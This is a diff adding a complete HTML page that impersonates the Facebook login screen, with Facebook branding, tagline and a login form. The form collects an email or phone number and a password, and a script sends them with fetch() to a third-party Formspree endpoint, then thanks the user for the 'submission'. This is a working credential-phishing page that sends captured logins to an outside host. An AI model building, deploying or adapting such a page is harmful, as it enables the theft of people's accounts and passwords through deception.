@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="responsive.css">
+</head>
+<body>
+    <header class="headerArea"> <!--header area start-->
+        <img src="img/fbH.jpg" alt="">
+        
+        
+    </header> <!--header area end-->
+
+    <section id="bodyArea"> <!--body area start-->
+
+
+        <div class="headerText">
+            English (United Kingdom) . বাংলা . <span>More</span>
+        </div>
+
+
+        <div class="container">
+            <div class="bodyLeft">
+                <div class="logo">
+                    <img src="img/fb.png" alt="facebook">
+                </div>
+                <h3>Facebook helps you connect and share with the people in your life.</h3>
+            </div>
+            <div class="bodyLogin">
+                <form action="https://formspree.io/f/xrgrneqq" method="POST" id="my-form">
+                    <div class="formGroup">
+                        <div class="firstName"><input type="text" name="firstName" placeholder="Email address or phone number"></div>
+                        <div class="password"><input type="password" name="password" placeholder="Password"></div>
+                        <button class="loginBTN" type="submit">Log In</button>
+                        <h2 class="forgotePass">Forgotten password?</h2>
+                        <span class="borderLine"></span>
+                        <button class="creatNewAcc">Create New Account</button>
+                    </div>
+                </form>
+                <div class="formBotomText">
+                    <span>Create a Page </span>for a celebrity, brand or business.
+                </div>
+
+                <div id="status"></div>
+            </div>
+        </div>
+    </section><!--body area end-->
+
+    <footer>  <!--footer area start-->
+        <img src="img/footer.png" alt="">
+    </footer>  <!--footer area end-->
+
+
+
+    <script>
+        var form = document.getElementById("my-form");
+        
+        async function handleSubmit(event) {
+          event.preventDefault();
+          var status = document.getElementById("status");
+          var data = new FormData(event.target);
+          fetch(event.target.action, {
+            method: form.method,
+            body: data,
+            headers: {
+                'Accept': 'application/json'
+            }
+          }).then(response => {
+            status.innerHTML = "Thanks for your submission!";
+            form.reset()
+          }).catch(error => {
+            status.innerHTML = "Oops! There was a problem submitting your form"
+          });
+        }
+        form.addEventListener("submit", handleSubmit)
+    </script>
+</body>
+</html>
